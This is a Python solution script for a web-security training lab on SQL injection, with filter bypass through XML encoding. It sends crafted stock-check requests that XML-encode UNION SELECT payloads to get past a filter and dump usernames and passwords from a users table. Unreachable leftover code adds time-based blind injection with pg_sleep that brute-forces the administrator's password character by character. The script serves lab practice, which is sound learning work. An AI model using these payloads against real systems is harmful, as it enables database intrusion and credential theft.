# SQL injection 48 of 51
# Lab: SQL injection with filter bypass via XML encoding

import asyncio
from pprint import pprint
from common.base import run_payloads

RAW_REQUEST = """
POST /product/stock HTTP/2
Host: 0aca003f044e80e680601c25008c00b1.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0aca003f044e80e680601c25008c00b1.web-security-academy.net/product?productId=3
Content-Type: application/xml
Content-Length: 107
Origin: https://0aca003f044e80e680601c25008c00b1.web-security-academy.net
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: session=D6OVQNqd0RnbNTl3ybc3wuX36SL2EC31
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
TE: trailers

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>3</productId><storeId>@@@PAYLOAD@@@</storeId></stockCheck>
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True)
    return result

async def print_net_result(raw_req, print_response_body=False):
    result = await one_call(raw_req)
    if result['status_code'] == 200:
        secs = result['total_seconds']
        print(f" CALL OK, {secs:.2f} secs")
        if print_response_body: pprint(result['full_text'])
        return True, secs
    else:
        print(" CALL FAILED")
        if print_response_body: pprint(result['full_text'])
        return False, result['total_seconds']

def xmlencode (text: str) -> str:
    return "".join(f"&#x{ord(c):X};" for c in text)

async def main():

    raw_req_0 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "1")
    print('PLAIN CALL:', end='')
    await print_net_result(raw_req_0, True)

    # It has success
    raw_req_3 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "1+1")
    print('USING SQL OPERATION:', end='')
    await print_net_result(raw_req_3, True)

    # It fails (attack detected!)
    raw_req_5 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "1 UNION SELECT NULL")
    print('USING SQL UNION:', end='')
    await print_net_result(raw_req_5, True)

    # Test encoding (success!)
    raw_req_8 = RAW_REQUEST.replace("@@@PAYLOAD@@@", xmlencode("1 UNION SELECT NULL"))
    print('USING SQL UNION (xml-encoded):', end='')
    await print_net_result(raw_req_8, True)

    # Test encoding (returns zero, due to columns count)
    raw_req_9 = RAW_REQUEST.replace("@@@PAYLOAD@@@", xmlencode("1 UNION SELECT NULL,NULL"))
    print('USING SQL UNION (xml-encoded, two NULLs):', end='')
    await print_net_result(raw_req_9, True)

    # Username and password retrieval
    raw_req_10 = RAW_REQUEST.replace("@@@PAYLOAD@@@", xmlencode("1 UNION SELECT username || '~' || password FROM users"))
    print('FINAL ATTACK:', end='')
    await print_net_result(raw_req_10, True)


    return

    raw_req_2 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--")
    print('WITH DELAY:', end='')
    await print_net_result(raw_req_2, False)

    # Response takes no extra time
    raw_req_3 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--")
    print('WITHOUT DELAY:', end='')
    await print_net_result(raw_req_3, False)

    # Response takes extra time if administrator user exists
    raw_req_4 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--")
    print('Check administrator user existence:', end='')
    await print_net_result(raw_req_4, False)

    # We could use "greather than" instead of "equals" and use binary search for the length, but I kept it simple!
    pwd_len = None
    for i in range(1, 40):
        payload = """'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=@@@LEN@@@)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--""".replace("@@@LEN@@@", str(i))
        raw_req_5 = RAW_REQUEST.replace("@@@PAYLOAD@@@", payload)
        print(f'administrator password length {i}:', end='')
        (ok, secs) = await print_net_result(raw_req_5)
        if ok and secs > 8:
            pwd_len = i
            break

    import string
    pwd = ''
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
    for i in range(1, pwd_len+1):
        for c in charset:
            payload = f"""'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{c}')+THEN+pg_sleep(8)+ELSE+pg_sleep(0)+END+FROM+users--"""
            raw_req_8 = RAW_REQUEST.replace("@@@PAYLOAD@@@", payload)
            print(f'administrator password {c} in position {i+1}:', end='')
            (ok, secs) = await print_net_result(raw_req_8)
            if ok and secs > 7:
                pwd += c
                print(f'Password so far: {pwd}')
                break
    

if __name__ == "__main__":
    asyncio.run(main())